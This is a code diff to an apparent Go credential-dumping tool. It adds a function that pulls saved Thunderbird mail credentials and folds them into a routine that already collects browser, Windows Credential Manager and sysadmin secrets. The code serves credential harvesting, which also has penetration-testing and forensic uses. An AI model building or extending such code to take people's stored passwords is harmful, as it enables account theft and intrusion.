@@ -38,9 +38,8 @@ func ExtractChromiumCredentials() common.ExtractCredentialsResult {
 }
 
 /**
-Function that check saved credentials in firefox browser and thunderbird
+Function that check saved credentials in firefox browser
 
-targetType parameter: "mail" parameter value is used for Thunderbird processing, all others for Firefox-based software
 */
 func ExtractFirefoxCredentials() common.ExtractCredentialsResult {
 	return browsers.MozillaExtractDataRun("browser")
@@ -67,6 +66,21 @@ func ExtractCredmanData() ([]common.UrlNamePass, int) {
 		return windowsResult.Data, len(windowsResult.Data)
 	}
 	return nil, 0
+}
+
+/*
+	Function that extract saved credentials from mail software. Currently support only thunderbird
+*/
+func ExtractMailData() ([]common.UrlNamePass, int) {
+	thunderbirdData := browsers.MozillaExtractDataRun("mail")
+
+	var allMailData []common.UrlNamePass
+
+	if thunderbirdData.Success {
+		allMailData = append(allMailData, thunderbirdData.Data...)
+	}
+
+	return allMailData, len(allMailData)
 }
 
 //Function to search for files on the file system with specific suffixes.
@@ -119,6 +133,7 @@ type AllDataStruct struct {
 	BrowserData  []common.UrlNamePass `json:"browser"`
 	CredmanData  []common.UrlNamePass `json:"credman"`
 	SysadminData SysadminData         `json:"sysadmin_data"`
+	Mail         []common.UrlNamePass `json:"mail"`
 }
 
 //Function in "give me all" style. The function will return everything that the program can extract from OS.
@@ -127,6 +142,7 @@ func ExtractAllData() (AllDataStruct, int) {
 	var browserData, lengthBrowserData = ExtractBrowserCredentials()
 	var credmanData, lengthCredmanData = ExtractCredmanData()
 	var sysadminData = ExtractSysadminData()
+	var mailData, lengthMailData = ExtractMailData()
 
 	var outDataStruct AllDataStruct
 
@@ -138,6 +154,9 @@ func ExtractAllData() (AllDataStruct, int) {
 	}
 	if lengthCredmanData > 0 {
 		outDataStruct.CredmanData = credmanData
+	}
+	if lengthMailData > 0 {
+		outDataStruct.Mail = mailData
 	}
 	outDataStruct.SysadminData = sysadminData
 
